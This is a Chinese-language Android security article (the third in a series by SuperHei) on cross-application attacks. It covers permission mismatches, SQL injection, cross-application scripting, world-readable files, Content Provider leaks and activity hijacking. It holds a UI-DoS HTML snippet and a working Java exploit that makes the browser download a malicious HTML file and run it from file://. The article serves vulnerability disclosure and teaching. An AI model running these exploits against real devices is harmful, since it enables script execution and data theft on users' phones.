@@ -1,0 +1,361 @@
+Android应用安全之android平台上的跨应用攻击
+
+by SuperHei_at_www.80vul.com
+
+一、前言
+
+    我们在第一篇《Android应用安全之开发环境带来的危险》一文了主要是谈论的是跨平台
+攻击，而在第二篇《Android应用安全之android平台上的xss攻击》里提到是android平台上
+的跨站攻击，那么我们在最后的第三篇里将给大家带来的是android平台上的跨应用攻击。在
+现在有的android平台安全问题更加聚焦在那些安装时申请一大堆权限的恶意木马应用，而忽
+视了正常跨应用通讯机制里的应用安全问题...
+
+
+二、Android安全机制简介
+
+"Android是一个权限分离的系统。这是利用Linux已有的权限管理机制，通过为每一个 
+Application 分配不同的 uid 和 gid ， 从而使得不同的 Application 之间的私有数据和
+访问（ native 以及 java 层通过这种 sandbox 机制，都可以）达到隔离的目的 。 与此同
+时， Android还在此基础上进行扩展，提供了 permission 机制，它主要是用来对 
+Application 可以执行的某些具体操作进行权限细分和访问控制....."
+
+从上面的信息可以看出来，android的安全机制大体分2个部分：
+
+1、linux内核安全机制
+Android应用程序运行在它们自己的Linux进程上，并被分配一个惟一的用户ID。默认情况
+下，运行在基本沙箱进程中的应用程序没有被分配权限，因而防止了此类应用程序访问系统
+或资源。
+
+2、权限机制
+权限是android平台上的应用级别的安全机制，贯穿着整个应用安全流程，它主要体现在允许
+或限制应用程序访问受限的API和资源。对于一个应用程序来说，首先它可以申明本身资源访
+问权限，包括在manifest文件申明设置，还包括应用程序开发时api里设置权限等。 然后就
+是这个程序在访问其他或者系统受限的API和资源时候，就需要通过设置manifest文件提出申
+请，用户安装的时候用户允许后才可以成功安装。
+
+三、跨应用通讯
+
+由于上面提到的android的sandbox安全模式，每个应用程序都是在自己的进程里，所以为了
+实现不同应用程序之间的数据交流，android设计了4种的组件实现：Activity、
+Broadcast 、Service另外还包括用于数据处理的Content Provider。
+
+这4种方式的具体实现方式，详见《android中跨进程通讯的4种方式》[1]。
+
+另外，上面的方式是对于不同进程不同应用之间的通讯，当然还有一种方式可以实现不同应
+用设置为同一进程共享数据资源：使用相同数字签名签署设置为同一个进程[设置manifest文
+件里的android:sharedUserId属性]，由于需要数字签名，而这个签名之掌握在开发者手里，
+当然如果这个签名被攻击者得到那就是另外一说了。 ：）
+
+四、跨应用数据提交与数据接收
+
+对于Activity、Broadcast 、Service 这3种组件，都是通过intents来提交提交数据的，对
+应的参数传递接口如下：
+
+Activity：Context.startActivity()、Activity.startActivityForRestult()
+Service：Context.startService()、Context.bindService() 
+Service：Context.sendBroadcast()、Context.sendOrderedBroadcast()、Context.sendStickyBroadcast()
+
+至于Intent对象详细处理方式请参考：[2]
+
+我们用一个demo说明：
+
+	Intent intent = new Intent();
+	intent.setAction("org.xxxx.ACTION");
+	intent.putExtra("arg1", "hello");
+	intent.putExtra("arg2", "world");
+	startService(intent);
+
+上面的代码是发送给startService(intent);所以目标是一个Service，发送的action名为
+"org.xxxx.ACTION"，至于具体的参赛提交是使用的putExtra附加数据的方式。我们在看看目
+标Service app的manifest文件代码：
+
+        <service android:name="RemoteCallService">
+            <intent-filter>
+                <action android:name="org.xxxx.ACTION"></action>
+            </intent-filter>
+        </service>
+
+对于参数提交我们还可以通过目标apk注册协议（<data android:scheme="info"/>）的方式
+用intent提交：
+
+Intent intent = new Intent("org.xxxx.ACTION"，Uri.parse("info://host/data" ));
+
+[ps:当然这个协议支持浏览器提交的话，我们可以直接可以通过网页里调用并提交参数]
+
+我们再看看目标apk提取接收参数的方式,对应于提交action和data，接收也有对应的处理 如：
+
+intent.getAction() 得到提交的action
+intent.getStringExtra("arg1"); 得到附加的数据
+
+另外也可以通过 getIntent()来处理如：
+
+Bundle extras = getIntent().getExtras(); 
+userName = extras.getString("arg1");
+
+还有用getIntent().getData()来得到intent第2个参数Uri方式提交的数据[也就是上面提到
+的协议方式]。
+
+五、漏洞模型
+
+对于跨应用的漏洞主要表现在“权限”的对抗里，在上面的“Android安全机制简介”里，我
+们知道一个apk在所用一些限制功能时要通过<uses-permission>在安装时向用户提出申请，
+这个就是“权限请求”。那么apk在提供Activity、Broadcast 、Service等时应该申明权限
+进行限制，这也就是“权限申明”。当某apk权限请求与权限申明不对等的时候，那么恶意
+apk在没有对应<uses-permission>请求下，可以通过访问用户安装其他合法apk的Activity、
+Broadcast 、Service方式来突破。换句话说就是：恶意的apk在没有任何权限请求下，通过
+其他正规的apk提供的“功能”来实现某些受限制的操作,这些操作主要表现在某些私有数据
+的安全上。
+
+对于应用安全来说，我以前说过“有什么样的功能，就可能带来什么样的漏洞“，对于apk在
+接收参数后实现的功能就决定了“漏洞的类型”。比如当参数处理后进入sql操作，就有可能
+参赛sql注射漏洞。所以在pc平台上常见的应用安全漏洞类型，很有可能在android平台上重
+现：
+
+a、非授权访问
+
+这个主要是针对apk在实现某些有危险操作的功能时候，缺少认证或者说没有设置对应的私有
+权限，导致第三方恶意apk非授权访问这些功能。wooyun上公布的《乐phone手机系统重启漏
+洞》[3]及《乐phone手机任意软件包安装删除漏洞》[4]就是典型的例子。
+
+b、sql注射
+
+在android平台上，应用程序使用的数据库是基于Sqlite，android SDK提供了数据库操作类
+SQLiteOpenHelper，在SQLiteOpenHelper里使用的查询、更新、插入、删除等操作都使用了
+参数绑定的方式，所以如果是正规调用的话，是很难产生sql注射的！当然这个世界不可能是
+完美的！
+
+不过还有一个函数有可能导致sql注射：
+
+public void execSQL (String sql)
+
+Since: API Level 1
+Execute a single SQL statement that is NOT a SELECT or any other SQL statement 
+that returns data.
+It has no means to return any data (such as the number of affected rows). 
+Instead, you're encouraged to use insert(String, String, ContentValues), 
+update(String, ContentValues, String, String[]), et al, when possible.
+When using enableWriteAheadLogging(), journal_mode is automatically managed by 
+this class. So, do not set journal_mode using "PRAGMA journal_mode'" statement 
+if your app is using enableWriteAheadLogging()
+Parameters
+
+sql	the SQL statement to be executed. Multiple statements separated by 
+semicolons are not supported.
+Throws
+
+SQLException	if the SQL string is invalid
+
+但是这个函数是没有返回的，也不支持多语句。所以即使是有漏洞，利用起来也会比较麻烦。
+
+如果存在sql注射，那么将危险到apk私有的数据库里数据的安全。
+
+c、Cross-Application Scripting
+
+这个概念首先出现在IBM Rational Application Security Research Group的一个漏洞公告
+里：《Android Browser Cross-Application Scripting》[5]，这个方式其实就是
+当apk在接收第三方恶意apk提交的参赛，没有处理好进入浏览器或者webview控件，导致的
+xss攻击。 这个区别于《Android应用安全之android平台上的xss攻击》一文的地方在于，发
+起估计方式不同，这里只限于第三方恶意apk发起的方式。 至于其他的漏洞挖掘分析及利用
+效果那都是一样的。
+
+d、命令执行
+
+当参数进入Runtime.getRuntime().exec()时，可能导致以目标apk用户权限执行命令。
+
+e、本地文件读写
+
+android的安全机制是深入到了sdk各大api领域的，在本地数据存储（Shared Preferences、
+Internal Storage、External Storage、SQLite Database）各大api创建文件时，都是可以
+设置对应的读写权限的，如：
+
+public abstract SharedPreferences getSharedPreferences (String name, int mode)
+
+Since: API Level 1
+Retrieve and hold the contents of the preferences file 'name', returning a 
+SharedPreferences through which you can retrieve and modify its values. Only 
+one instance of the SharedPreferences object is returned to any callers for the 
+same name, meaning they will see each other's edits as soon as they are made.
+Parameters
+
+name	Desired preferences file. If a preferences file by this name does not 
+exist, it will be created when you retrieve an editor 
+(SharedPreferences.edit()) and then commit changes (Editor.commit()).
+mode	Operating mode. Use 0 or MODE_PRIVATE for the default operation, 
+MODE_WORLD_READABLE and MODE_WORLD_WRITEABLE to control permissions. The bit 
+MODE_MULTI_PROCESS can also be used if multiple processes are mutating the same 
+SharedPreferences file. MODE_MULTI_PROCESS is always on in apps targetting 
+Gingerbread (Android 2.3) and below, and off by default in later versions.
+Returns
+
+Returns the single SharedPreferences instance that can be used to retrieve and 
+modify the preference values.
+See Also
+
+MODE_PRIVATE
+MODE_WORLD_READABLE
+MODE_WORLD_WRITEABLE
+MODE_MULTI_PROCESS
+
+getSharedPreferences()第2个参数就是设置权限。如果在apk开发里程序员错误的设置了
+other的权限，那么就可以导致安全问题。
+
+other可读 ---> 可以直接导致信息泄漏，在《Android应用安全之android平台上的xss攻击》
+一文里xss的利用就是other可读。
+other可写 ---> 可以导致原有存储的数据被篡改，成而引发一系列安全问题[这个类是于我
+以前web安全里“二次攻击”]。常见于一些配置变量被篡改的问题。
+
+当然如果apk在接收参数后，参数进入原有功能里的文件读写api的操作，那么有可能导致
+apk本事的数据安全的问题，及时合理使用了MODE_PRIVATE。
+
+对于这类问题的审核，我们可以通过扫描文件属性来得到你的系统上那些文件是other可读
+写的。类似于《Android应用安全之android平台上的xss攻击》一文通过android-php来扫描
+的方法。另外要强调的是sdcard上的文件默认是“other可读”的。
+
+f、Content Provider设置不当导致数据泄漏
+
+Content Provider是android平台上跨应用程序共享数据的方式。也就是说“Content 
+Provider 存在的目的向其他应用程序共享数据和允许其他应用程序对数据进行增、删、改
+操作。” 当然按照android的安全设计，对于Content Provider一样可以设置对应的权限，
+如 <provider  android:permission="string" android:readPermission="string" 
+android:writePermission="string" ></provider> 以及<grant-uri-permission>的处理等。
+然而：
+
+当某些应用程序把不该共享的数据共享时...
+当某些应用次序把不改共享数据写权限的时...
+当.....
+
+这个都将威胁到你的数据安全。比如一个典型的例子：
+《Dropbox for Android Vulnerability Breakdown》[6]
+
+
+g、其他攻击方式：如中间人攻击、UI-Dos等
+
+[updata:2011年12月5日]
+
+这些问题其实更多的是属于android平台上设计权限导致的一些安全问题：
+
+中间人攻击：
+
+在进行跨应用通讯时，系统会根据manifest文件里的<intent-filter>去启动对用的服务
+等，当我们的恶意apk设置伪造对应的服务等及对应的<intent-filter>时，当用户通过在
+2个正常的应用通讯时候，导致提交的参数被中间人(恶意的apk)所截取，另外在Defcon19上
+trustwave的大牛演示了一种通过劫持activity来达到中间人攻击效果的方法：[7]
+
+上面提到的2个问题，盛大的DODO牛做了详细的分析，详见：
+《android安全-activity劫持》 [8]
+《android安全-intent》[9]
+
+
+UI-dos
+
+移动设备显示屏幕小、输入困难等先天条件导致了一些产品在UI设计处理上过于简陋，导致
+一些安全问题。比如下面的脚本：
+
+<meta http-equiv="refresh" content="0;URL=[self url]"/> 
+<iframe src="tel:1122234555"></iframe>
+
+当浏览器访问这个html会不断刷新，会导致不停的弹出拨号的界面...
+
+六、0day演示
+
+Browsers for android Cross-Application Scripting Vulnerability
+
+在android平台上，绝大多数的浏览器，允许被第三方应用程序调用浏览网页，如调用
+android自带浏览器访问http://www.80vul.com的代码如下：
+
+	Intent res = new Intent("android.intent.action.VIEW");
+	res.setComponent(new ComponentName("com.android.browser","com.android.browser.BrowserActivity"));
+	res.setData(Uri.parse(“http://www.80vul.com”));
+
+如果我们通过这个方法通过file://协议打开本地的html文件呢？那么改html里的js就是在
+file://“域”里执行的。只要我们可以把恶意的html/js代码存放到目标的手机就可以了
+...
+
+《Android应用安全之android平台上的xss攻击》里的“[0day-NO.3]、android-browser和
+firefox自动下载文件漏洞” 可以帮我们实现这个条件。 EXp代码如下:
+
+//codz base on http://blog.watchfire.com/files/advisory-android-browser.pdf
+package com.x;
+//opera 
+//com.opera.browser com.opera.Opera
+
+//firefox 
+//org.mozilla.firefox org.mozilla.firefox.App
+
+//android
+//com.android.browser com.android.browser.BrowserActivity
+
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+
+public class TesttestActivity extends Activity {
+	static final String mPackage = "com.android.browser";
+	static final String mClass = "com.android.browser.BrowserActivity";
+	static final String gomPackage = "com.opera.browser";
+	static final String gomClass = "com.opera.Opera";
+	static final String mUrl = "http://www.80vul.com/autodown.php";
+	static final int mSleep = 15000;
+	@Override
+	public void onCreate(Bundle savedInstanceState) {
+	super.onCreate(savedInstanceState);
+	setContentView(R.layout.main);
+	startBrowserActivity(mUrl);
+	try {
+	Thread.sleep(mSleep);
+	}
+	catch (InterruptedException e) {}
+	startBrowserActivitygo("file:///sdcard/Download/g.htm");
+	}
+	private void startBrowserActivity(String url) {
+	Intent res = new Intent("android.intent.action.VIEW");
+	res.setComponent(new ComponentName(mPackage,mClass));
+	res.setData(Uri.parse(url));
+	startActivity(res);
+	}
+	private void startBrowserActivitygo(String url) {
+	Intent res = new Intent("android.intent.action.VIEW");
+	res.setComponent(new ComponentName(gomPackage,gomClass));
+	res.setData(Uri.parse(url));
+	startActivity(res);
+	}
+}
+
+上面的代码首先是通过调用com.android.browser访问
+http://www.80vul.com/autodown.php自动下载一个恶意htm文件到目标手机上，路径为
+/sdcard/Download/g.htm，然后调用其他的浏览器或者android自带的浏览器访问
+file:///sdcard/Download/g.htm 来实现在file://下执行任意js的目的。
+
+不过对于firefox、opera来说，即使你拥有了file://下执行js的能力，也将无所作为！ 它
+们在限制本地html方面做里大量的防御工作，比如你不可以使用在firefox通过xmlhttp去读
+取本地的其他目录的文件，也不可以读取http域的内容，当然如果你找到突破这些防御的方
+法，那么你就可以做点其他什么事情了 ：）
+
+七、小结
+
+对于android安全机制来说都是围绕着“权限”展开的，而且这个“权限”设计深入到
+android的各个细节，也正是这个原因，导致很多开发者对于这些细节的认识不够，很容易
+导致应用程序的“权限请求与权限申明不对等”而导致漏洞。另外andriod在某些框架的设
+计上是存在问题的，尤其是在webkit的设计上。我不知道官方会不会承认我演示的
+android平台上浏览器“Cross-Application Scripting”的问题，不过就效果来说他可以实
+现《Android Browser Cross-Application Scripting》[5]一样的效果，这样的
+恶意apk都是不需要任何权限请求的。另外也可以附加恶意的html到asset目录，如何通过
+webview调用（file:///android_asset/a.htm）来实现上面的效果，但是这个方式要攻击成
+功最起码要请求android.permission.INTERNET权限。
+
+最后感谢文章里引用资源的那些作者们，另外特别感谢luoluo牛的指导和各种demo编写。
+
+八、参考
+[1]http://blog.csdn.net/yan8024/article/details/6444368
+[2]http://developer.android.com/reference/android/content/Intent.html
+[3]http://www.wooyun.org/bugs/wooyun-2010-0511
+[4]http://www.wooyun.org/bugs/wooyun-2010-0509
+[5]http://blog.watchfire.com/files/advisory-android-browser.pdf
+[6]http://intrepidusgroup.com/insight/2011/08/dropbox-for-android-vulnerability-breakdown/
+[7]https://media.defcon.org/dc-19/presentations/Percoco-Spiderlabs/DEFCON-19-Percoco-Spiderlabs-Droid.pdf
+[8]http://www.sectop.com/?p=242
+[9]http://www.sectop.com/?p=187
+
+-EOF-
